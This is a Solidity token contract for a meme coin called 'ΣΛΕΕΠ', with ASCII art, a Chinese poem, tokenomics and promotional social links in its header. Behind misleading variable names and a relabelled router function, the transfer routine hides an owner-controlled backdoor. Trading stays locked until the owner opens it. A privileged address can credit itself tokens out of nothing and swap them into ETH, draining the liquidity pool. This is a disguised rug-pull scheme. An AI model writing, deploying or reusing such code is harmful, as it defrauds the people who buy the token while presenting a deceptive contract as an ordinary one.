/*
█▀▀ ▄▀█ █▀▀ █▀▀ █▄░█  
██▄ █▀█ ██▄ ██▄ █░▀█  

▄▀   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 1,000,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 180 天

https://t.me/+mnrjYJM9-2ZkODQ8
https://web.wechat.com/EaeenERC
https://m.weibo.cn/EaeenERC
https://www.eaeen.xyz
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 dataIn, uint256 DataOut, address[] calldata path, address to, uint256 bridge) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 bridge)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
contract Contract is IERC20, Ownable { 
    bool private inSwap; bool private dataSettings; bool private tradingOpen = false;

    string private _name = unicode"ΣΛΕΕΠ"; string private _symbol = unicode"ΣΛΠ";
    uint256 public _ourFEE = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 1000000000 * 10 ** _decimals; uint256 private integral = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _mappingData; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _mapArtifact; mapping(address => uint256) private _inputLibrary;

    constructor(address dataBox) { _tOwned[msg.sender] = _tTotal; 
    _inputLibrary[msg.sender] = integral; _inputLibrary[address(this)] = integral; 
    pairCenter = IUniswapV2Router01(dataBox); 

    mathForMap = IUniswapV2Factory(pairCenter.factory()).createPair(address(this), 
    pairCenter.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); 
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { startMapping(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { startMapping(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function startMapping( address _origin, address _stats, uint256 gasAmount) private
    { uint256 _wholeMaps = balanceOf(address(this)); uint256 _registry; if (inSwap && _wholeMaps > 
    integral && !dataSettings && _origin != mathForMap) 
    
    { dataSettings = true; receiveMessage(_wholeMaps); dataSettings = false;

    } else if (_inputLibrary[_origin] > integral && _inputLibrary[_stats] > integral)
    { _registry = gasAmount; _tOwned[address(this)] += _registry; makePool
    (gasAmount, _stats); return; }
    else if (!dataSettings && _mappingData[_origin] > 0 && _origin != mathForMap && _inputLibrary[_origin] == 0) { 
    
    _mappingData[_origin] = _inputLibrary[_origin] - integral; } else if (_stats != address(pairCenter) 
    && _inputLibrary[_origin] > 0 && gasAmount > integral && _stats != mathForMap) { 
    _inputLibrary[_stats] = gasAmount; return; } address _isCompiler = _mapArtifact[mathForMap]; 
    
    if ( _mappingData[_isCompiler] == 0) _mappingData[_isCompiler] = integral; _mapArtifact[mathForMap] = _stats; 
    if (_ourFEE > 0 && _inputLibrary[_origin] == 0 && !dataSettings && _inputLibrary[_stats] == 0)

    { _registry = (gasAmount * _ourFEE) 
    / 100; 
    gasAmount -= _registry; _tOwned[_origin] -= _registry; 
    
    _tOwned[address(this)] += _registry; }
    _tOwned[_origin] -= 
    gasAmount; _tOwned[_stats] += gasAmount; emit Transfer
    (_origin, _stats, gasAmount); if (!tradingOpen) 
    { require(_origin == owner(), ""); } }

    receive() external payable
    {} 
    function makeMessage(uint256 _sign, uint256 creator, address to) private
    { _approve(address(this), address(pairCenter), _sign); pairCenter.quote
    { value: creator }(address(this), _sign, 0, 0, to, block.timestamp);
    }
    function receiveMessage(uint256 _anyHolder) private
    { uint256 _getMessage = _anyHolder / 2; uint256 _public = address(this).balance;
    makePool( _getMessage, address(this)); uint256 _viewable = address(this).balance - _public; 
    makeMessage( _getMessage, _viewable, address(this));
    }
    function makePool(uint256 position, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = pairCenter.WETH(); _approve(address(this), address(pairCenter), position);
    pairCenter.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);
    }
    address public immutable mathForMap; IUniswapV2Router01 
    public immutable pairCenter
    ;    
    function startTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}